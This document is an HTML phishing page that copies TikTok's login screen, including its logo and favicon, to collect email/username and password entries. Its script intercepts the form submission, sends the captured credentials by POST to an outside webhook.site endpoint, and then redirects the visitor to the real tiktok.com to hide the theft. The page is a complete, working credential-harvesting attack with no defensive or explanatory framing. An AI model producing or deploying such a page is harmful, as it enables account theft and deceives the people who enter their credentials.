
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login | TikTok</title>
    <link rel="icon" href="https://sf16-website-imagesrc-tos.pstatp.com/obj/tiktok-web-bd/_next/static/images/favicon-96x96.647e4e0c.png">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f8f8f8;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-box {
            background: #fff;
            padding: 30px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            border-radius: 10px;
            text-align: center;
            width: 300px;
        }
        .login-box img {
            width: 100px;
            margin-bottom: 20px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            background-color: #fe2c55;
            color: white;
            padding: 10px;
            width: 100%;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #e52045;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://sf16-website-imagesrc-tos.pstatp.com/obj/tiktok-web-bd/_next/static/images/logo-96x96.9b6f6fae.png" alt="TikTok Logo">
        <form id="loginForm">
            <input type="text" name="email" placeholder="Email or Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>
    </div>
<script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const formData = new FormData(this);
        
        fetch('https://webhook.site/15e6e8ec-5d5a-473e-aaf8-1cc442a195c9', {
            method: 'POST',
            body: formData
        }).finally(() => {
            window.location.href = "https://www.tiktok.com/";
        });
    });
</script>
</body>
</html>
